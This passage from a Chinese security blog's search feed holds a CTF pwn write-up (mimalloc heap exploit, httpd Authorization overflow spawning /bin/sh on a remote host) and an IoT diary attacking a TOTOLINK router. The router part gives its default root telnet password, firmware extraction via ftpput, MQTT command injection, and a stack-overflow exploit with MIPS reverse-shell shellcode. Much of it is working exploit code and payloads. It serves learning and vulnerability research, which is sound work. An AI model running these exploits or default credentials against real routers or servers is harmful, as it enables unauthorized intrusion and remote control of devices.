class="hljs-string">&quot;---&gt;&quot;</span>+hex(addr))<br><br><span class="hljs-keyword">menu</span> = <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;:\n&#x27;</span><br>def <span class="hljs-built_in">add</span>(size,content):<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;1&#x27;</span>)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>,str(size).encode())<br>    <span class="hljs-keyword">sa</span>(<span class="hljs-keyword">menu</span>,content)<br><br>def <span class="hljs-keyword">delete</span>(idx):<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;2&#x27;</span>)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>,str(idx).encode())<br><br>def <span class="hljs-keyword">edit</span>(idx,content):<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;3&#x27;</span>)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>,str(idx).encode())<br>    <span class="hljs-keyword">sa</span>(<span class="hljs-keyword">menu</span>,content)<br><br>def show(idx):<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;4&#x27;</span>)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>,str(idx).encode())<br><br>def pwn():<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x40, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span>x40)  # <span class="hljs-number">0</span><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x40, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span>x40)  # <span class="hljs-number">1</span><br><br>    show(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0</span>x40)<br>    heap_base = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&quot;\x00&quot;</span>)) - <span class="hljs-number">0</span>x20140<br><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;aa&#x27;</span>)  # <span class="hljs-number">2</span><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;aa&#x27;</span>)  # <span class="hljs-number">3</span><br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">edit</span>(<span class="hljs-number">2</span>, p64(heap_base + <span class="hljs-number">0</span>x158))<br><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>x3):<br>        <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">0</span>x8)<br>    show(<span class="hljs-number">6</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">8</span>)<br>    libmimalloc.address = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>)) + <span class="hljs-number">0</span>x1f48c0<br>    libc.address = libmimalloc.address - <span class="hljs-number">0</span>x1f2000<br><br>    leak(<span class="hljs-string">&quot;heap_base&quot;</span>, heap_base)<br>    leak(<span class="hljs-string">&quot;libcmimalloc&quot;</span>, libmimalloc.address)<br>    leak(<span class="hljs-string">&quot;libc.address&quot;</span>, libc.address)<br><br>    deferred_free = libmimalloc.address + <span class="hljs-number">0</span>x75f50<br>    setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br>    fake_rdx = heap_base + <span class="hljs-number">0</span>x30000<br>    pop_rdi = <span class="hljs-number">0</span>x0000000000023b6a + libc.address<br>    pop_rsi = <span class="hljs-number">0</span>x000000000002601f + libc.address<br>    pop_rdx = <span class="hljs-number">0</span>x0000000000142c92 + libc.address<br>    pop_rax = <span class="hljs-number">0</span>x0000000000036174 + libc.address<br>    syscall = <span class="hljs-number">0</span>x00000000000630a9 + libc.address<br>    <span class="hljs-keyword">ret</span> = <span class="hljs-number">0</span>x0000000000022679 + libc.address<br><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">8</span>)  # <span class="hljs-number">7</span><br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">7</span>)<br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">7</span>)<br>    <span class="hljs-keyword">edit</span>(<span class="hljs-number">7</span>, p64(deferred_free - <span class="hljs-number">0</span>x10))<br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;c&#x27;</span> * <span class="hljs-number">8</span>)<br><br><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x500, p64(<span class="hljs-number">0</span>) + p64(fake_rdx) + p64(setcontext))<br><br>    payload = <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;./flag\x00\x00&#x27;</span><br>    payload = payload.ljust(<span class="hljs-number">0</span>xa0, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(fake_rdx + <span class="hljs-number">0</span>xb0) + p64(<span class="hljs-keyword">ret</span>)<br><br>    orw = flat([<br>        pop_rdi, fake_rdx,<br>        pop_rsi, <span class="hljs-number">0</span>,<br>        pop_rdx, <span class="hljs-number">0</span>,<br>        pop_rax, <span class="hljs-number">2</span>,<br>        syscall,<br>        pop_rdi, <span class="hljs-number">3</span>,<br>        pop_rsi, fake_rdx + <span class="hljs-number">0</span>x1200,<br>        pop_rdx, <span class="hljs-number">0</span>x50,<br>        pop_rax, <span class="hljs-number">0</span>,<br>        syscall,<br>        pop_rdi, <span class="hljs-number">1</span>,<br>        pop_rax, <span class="hljs-number">1</span>,<br>        syscall<br>    ])<br><br>    <span class="hljs-keyword">edit</span>(<span class="hljs-number">2</span>, payload + orw)<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;1&#x27;</span>)<br><br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">menu</span>, <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;1&#x27;</span>)<br><br>    <span class="hljs-keyword">p</span>.interactive()<br><br>pwn()<br></code></pre></td></tr></table></figure><h2 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h2><p>赛后看了下好像和vnctf2022的classic httpd挺像的</p><p>就是Authorization那里的base64有个栈溢出</p><p>可以构造htdocs&#x2F;..&#x2F;..&#x2F;..&#x2F;bin&#x2F;sh</p><p>然后再绕一下就能进入sub_0x2993执行execl（cmd,0）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>flag=<span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;60.204.140.184&#x27;</span>, <span class="hljs-number">30318</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;&#x27;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-comment"># url = &quot;http://127.0.0.1:4000/&quot;</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># payload = &quot;a&quot;*0x3a + &quot;/../../../bin/sh?korey0sh1.html&quot;</span><br><span class="hljs-comment"># res = requests.get(url=url,auth=(&quot;Admin&quot;,payload))</span><br><span class="hljs-comment"># print(res.text)</span><br><br>payload = <span class="hljs-string">b&#x27;GET / HTTP/1.1\r\n&#x27;</span><br>payload += <span class="hljs-string">b&#x27;Authorization: Basic &#x27;</span> <br>payload += base64.b64encode(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;/../../../../../../bin/sh?korey0sh1.html&#x27;</span>)<br>payload += <span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span><br><br>sd(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>不知道为什么request发包不行</p><h1 id="0xff-写在最后的最后"><a href="#0xff-写在最后的最后" class="headerlink" title="0xff:写在最后的最后"></a>0xff:写在最后的最后</h1><p>题目感觉都挺常规的（pwn被各位大爹打烂了）</p><p>mi_malloc第一次做，学到新东西，很感谢出题师傅。</p><p>httpd这种协议模拟题好像碰到的越来越多了，感觉要搞个专题好好强化一下。</p>]]></content>
    
    
    <categories>
      
      <category>CtfMatch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF、Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>倒霉蛋的totolink学习手记</title>
    <link href="/2023/07/12/%E5%80%92%E9%9C%89%E8%9B%8B%E7%9A%84totolink%E5%AD%A6%E4%B9%A0%E6%89%8B%E8%AE%B0/"/>
    <url>/2023/07/12/%E5%80%92%E9%9C%89%E8%9B%8B%E7%9A%84totolink%E5%AD%A6%E4%B9%A0%E6%89%8B%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>kernel、v8、虚拟化、Iot，因为笔者并不想在pwn的学习上止步于CTF，且对Iot也有点兴趣，故选择了这条路（你以为是我不想当个内核带师吗，是实在是学不会啊）</p><p>在nameless爷爷的推荐下，笔者在咸鱼上买了一个totolink，以此来作为笔者Iot漏洞挖掘的入门教材。</p><h1 id="0x1-拿不到shell，妈妈生的"><a href="#0x1-拿不到shell，妈妈生的" class="headerlink" title="0x1:拿不到shell，妈妈生的"></a>0x1:拿不到shell，妈妈生的</h1><p>现在官网下载固件<a href="https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/172/ids/36.html">@totolink</a></p><p>用binwalk解压，提取出文件系统squashfs-root</p><p>在里面随便找找，便看到了telnet.asp，那便可以通过telnet服务拿到路由器的shell</p><p>再搜索一下“shadow”这种敏感文件</p><p><img src="/img/T10/1.png" alt="img"></p><p>user:root</p><p>pwd:其实网上一找就是“cs2012”，md5付费解密也行</p><p>OK现在就可以拿一下路由器的shell了</p><p>拿到设备先暴拆，然后插上网线，笔电连上totolink的无线</p><p><img src="/img/T10/0.jpg" alt="img"></p><p>登录网关</p><p><img src="/img/T10/2.png" alt="img"></p><p>可以看到笔者这个设备的固件版本已经很老了</p><p>先把网段改到192.168.55.1，避免和原本的撞上，再把防火墙一关，试着访问【IP】&#x2F;telnet.asp</p><p>结果半天加载不出来</p><p>后来无意看到totolink这个牌子要用极为先进的360浏览器的兼容模式才能访问（真的吐血）</p><p>通过网页把telnet的服务打开后，试着用nmap扫一下</p><p><img src="/img/T10/3.png" alt="img"></p><p>可以看到telnet服务的默认端口”23“已经打开，需要注意到的是这边还有个mqtt服务的默认端口1883也打开了</p><p>用telnet登录，user:root password:cs2012</p><p><img src="/img/T10/4.png" alt="img"></p><p>登陆进去了，好耶！！</p><p>结果默认的busybox着实有点寒酸，好在有wget，那就起个http服务拉个mipsel架构的busybox进去好了</p><p><img src="/img/T10/5.png" alt="img"></p><p>同时因为笔者的路由器固件版本实在是太老，所以笔者按照<a href="https://l0tus.vip/cn/totolink/">@I0tus</a>师傅博客中的方法，把真机中的固件拉了出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">./busybox-mipsel sh<br>./busybox-mipsel <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mtdblock1 of=./mtdblock1<br><span class="hljs-comment">#先在宿主机起个ftp</span><br>./busybox-mipsel ftpput -P 21 192.168.55.2 ./mtdblock1<br></code></pre></td></tr></table></figure><p>因为想试着打打真机，所以笔者接下来的分析都基于这份提取出来的固件</p><h1 id="0x2-用mqtt狠狠地注入"><a href="#0x2-用mqtt狠狠地注入" class="headerlink" title="0x2:用mqtt狠狠地注入"></a>0x2:用mqtt狠狠地注入</h1><p>用burp抓个包先</p><p>访问网关</p><p><img src="/img/T10/6.png" alt="img"></p><p>登录</p><p><img src="/img/T10/7.png" alt="img"></p><p>开启telnet服务</p><p><img src="/img/T10/9.png" alt="img"></p><p>看起来负责网络服务的是这个&#x2F;cgi-bin&#x2F;cstecgi.cgi</p><p>登录的时候存在密码泄露问题</p><p>同时，在使用登录服务和telnet服务的时候，可以看到有一些特别的字符串。</p><p>那就搜一下</p><p>”topicurl”存在于这几个elf文件中，结合抓包中出现的cstecgi.cgi，就把这个文件用ida打开看看</p><p><img src="/img/T10/10.png" alt="img"></p><p>结果刚进main函数一眼command injection，太抽象了</p><p><img src="/img/T10/11.png" alt="img"></p><p>但是cstecgi.cgi中并没有和“topicurl”实质有关的东西。</p><p>那再找一下”telnet_enabled”</p><p><img src="/img/T10/12.png" alt="img"></p><p>进system.so康康</p><p>找到了一个setTelnetCfg，发现和开关telnet服务的参数很像</p><p><img src="/img/T10/13.png" alt="img"></p><p>回溯这个函数， 出现module_init</p><p><img src="/img/T10/14.png" alt="img"></p><p>OK，cstecgi.cgi负责的是http服务，但最后的setTelnetCfg却是在module_init中执行。cstecgi.cgi找不到加载system.so的痕迹，两者并无瓜葛。</p><p>翻看<a href="https://blingblingxuanxuan.github.io/2021/09/25/analysis-of-totolink-t10/#%E9%9A%90%E8%97%8F%E7%9A%84telnet%E5%8A%9F%E8%83%BD">@blingbling</a>师傅的博客后，发现此处使用的是dlopen的方法（路径+.so文件名），于是搜索路径”&#x2F;lib&#x2F;cste_modules”</p><p>出现了唯一匹配的结果</p><p><img src="/img/T10/15.png" alt="img"></p><p>找到dlopen函数，这样思路就理通了</p><p><img src="/img/T10/16.png" alt="img"></p><p>cstecgi.cgi接受到http请求后，通过cste_sub做中转，然后到system.so执行。</p><p>那么问题来了，cste_sub是啥嘞</p><p>在路由器里用netstat -pantu查看端口后得知，cste_sub是1883端口（cs_broker）的客户端，而1883端口是mqtt的默认端口。</p><p><img src="/img/T10/17.png" alt="img"></p><p>所以在此设备中，http请求会先被转化mqtt，然后在不同的.so文件中得到执行。</p><p>那就来用mqtt狠狠注入吧！！</p><p>先下载mqtt.fx，配置好ip后订阅全部，为了效果显著一点，我们可以找一个command injection来试试</p><p>在&#x2F;lib&#x2F;cste_modules&#x2F;upgrade.so的function–setUpgradeFW中，存在一个command injection</p><p><img src="/img/T10/18.png" alt="img"></p><p>构造数据，直接用mqtt发送（${IFS}是用来绕过空格的）</p><p><img src="/img/T10/19.png" alt="img"></p><p>可以看到tmp文件夹下已经出现目标文件</p><p><img src="/img/T10/20.png" alt="img"></p><h1 id="0x3-来试试栈溢出吧"><a href="#0x3-来试试栈溢出吧" class="headerlink" title="0x3:来试试栈溢出吧"></a>0x3:来试试栈溢出吧</h1><p>&#x2F;lib&#x2F;cste_modules&#x2F;wps.so 中的function–setWiFiWpsConfig存在栈溢出漏洞</p><p>先拉个mipsel架构的gdbserver进去，在这边调试的时候是attach cste_sub的pid</p><p><img src="/img/T10/22.png" alt="img"></p><p>为了方便调试，这次用python发数据包</p><p>但是也可以先用mqtt.fx先发个cyclic生成的字符串确定一下offset</p><p><img src="/img/T10/23.jpg" alt="img"></p><p>然后用msf反弹shell一把梭</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-keyword">import</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">import</span> <span class="hljs-variable">paho</span>.<span class="hljs-property">mqtt</span>.<span class="hljs-property">client</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">mqtt</span><br><span class="hljs-keyword">import</span> <span class="hljs-variable">threading</span><br><br><span class="hljs-title function_">context</span>(<span class="hljs-variable">os</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">linux</span>&#x27;, <span class="hljs-variable">arch</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">mips</span>&#x27;, <span class="hljs-variable">log_level</span> <span class="hljs-operator">=</span> &#x27;<span class="hljs-variable">debug</span>&#x27;)<br><br><span class="hljs-variable">buf</span> <span class="hljs-operator">=</span>  <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xfa\xff\x0f<span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x78</span>\xe0<span class="hljs-char escape_">\x01</span>\xfd\xff\xe4<span class="hljs-char escape_">\x21</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xfd\xff\xe5<span class="hljs-char escape_">\x21</span>\xff\xff<span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x57</span><span class="hljs-char escape_">\x10</span><span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x24</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\x0c<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span>\xff\xff\xa2\xaf\xff\xff\xa4\x8f&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xfd\xff\x0f<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x78</span>\xe0<span class="hljs-char escape_">\x01</span>\xe2\xff\xaf\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x09</span>\x1d\x0e\x3c<span class="hljs-char escape_">\x09</span>\x1d\xce<span class="hljs-char escape_">\x35</span>\xe4\xff\xae\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x37</span><span class="hljs-char escape_">\x02</span>\x0e\x3c\xc0\xa8\xce<span class="hljs-char escape_">\x35</span>\xe6\xff\xae\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xe2\xff\xa5<span class="hljs-char escape_">\x27</span>\xef\xff\x0c<span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x01</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\x4a<span class="hljs-char escape_">\x10</span><span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x24</span>\x0c<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span>\xfd\xff<span class="hljs-char escape_">\x11</span><span class="hljs-char escape_">\x24</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x27</span><span class="hljs-char escape_">\x88</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x02</span>\xff\xff\xa4\x8f<span class="hljs-char escape_">\x21</span><span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x02</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xdf\x0f<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x24</span>\x0c<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span>\xff\xff<span class="hljs-char escape_">\x10</span><span class="hljs-char escape_">\x24</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xff\xff<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x22</span>\xfa\xff<span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x16</span>\xff\xff<span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x28</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x62</span><span class="hljs-char escape_">\x69</span>\x0f\x3c\x2f\x2f\xef<span class="hljs-char escape_">\x35</span>\xec\xff\xaf\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x68</span>\x0e\x3c\x6e\x2f\xce<span class="hljs-char escape_">\x35</span>\xf0\xff\xae\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xf4\xff\xa0\xaf\xec\xff\xa4<span class="hljs-char escape_">\x27</span>\xf8\xff\xa4\xaf&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\xfc\xff\xa0\xaf\xf8\xff\xa5<span class="hljs-char escape_">\x27</span>\xab\x0f<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x24</span>&quot;</span><br><span class="hljs-variable">buf</span> <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;\x0c<span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x01</span>&quot;</span><br><br><span class="hljs-variable">pay</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-operator">*</span><span class="hljs-number">60</span> <span class="hljs-operator">+</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x44</span><span class="hljs-char escape_">\x03</span><span class="hljs-char escape_">\x42</span>&quot;</span><br><br><span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-variable">mqtt</span>.<span class="hljs-property">Client</span>()<br><span class="hljs-variable">client</span>.<span class="hljs-property">connect</span>(<span class="hljs-string">&quot;192.168.55.1&quot;</span>,<span class="hljs-number">1883</span>,<span class="hljs-number">60</span>)<br><span class="hljs-variable">client</span>.<span class="hljs-property">publish</span>(&#x27;<span class="hljs-variable">totolink</span>/<span class="hljs-variable">router</span>/<span class="hljs-variable">setting</span>/<span class="hljs-variable">setWiFiWpsConfig</span>&#x27;,<span class="hljs-variable">payload</span><span class="hljs-operator">=</span>&#x27;&#123;<span class="hljs-string">&quot;topicurl&quot;</span>:<span class="hljs-string">&quot;setting/setWiFiWpsConfig&quot;</span>,<span class="hljs-string">&quot;WiFiIdx&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;PINPBCRadio&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;PINMode&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;PIN&quot;</span>:<span class="hljs-string">&quot;&#x27;+pay+&#x27;&quot;</span>&#125;&#x27;<span class="hljs-operator">+</span>&#x27;<span class="hljs-variable">bbbbb</span>&#x27;<span class="hljs-operator">+</span><span class="hljs-variable">buf</span>)<br></code></pre></td></tr></table></figure><p>比较蛋疼的是好像只有python2发过去的数据是正常的，python3就是一堆乱码</p><p>反弹shell的目标一定要和路由器同一个网段，不然弹不出来</p><h1 id="0x4-带学牲的第一次漏洞挖掘"><a href="#0x4-带学牲的第一次漏洞挖掘" class="headerlink" title="0x4:带学牲的第一次漏洞挖掘"></a>0x4:带学牲的第一次漏洞挖掘</h1><p>水了两个CVE（CVE-2023-40041&amp;CVE-2023-40042)，都是低质量漏洞，当时只想着能不能拿个CVE也没怎么深挖</p><h1 id="0x5-UART串口调试"><a href="#0x5-UART串口调试" class="headerlink" title="0x5: UART串口调试"></a>0x5: UART串口调试</h1><p>第一次焊接，属实是丑了一点，但好在功能是一点问题都没有</p><p><img src="/img/iot1/0.jpg" alt="img"></p><p>Nameless爷爷推荐的三排针确实挺好用的，但是这送的锡丝就是一坨shit，质量差的一批。</p><p>用SecureCRT直接quick connect就能进，但不知道为什么我笔记本两个COM口一个连上去就是没反应，换了一个就行了。</p><p>但进去后奇怪的是在uboot加载好后kernel加载之前狂按回车进不到uboot。</p>]]></content>
    
    
    <categories>
      
      <category>Iot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
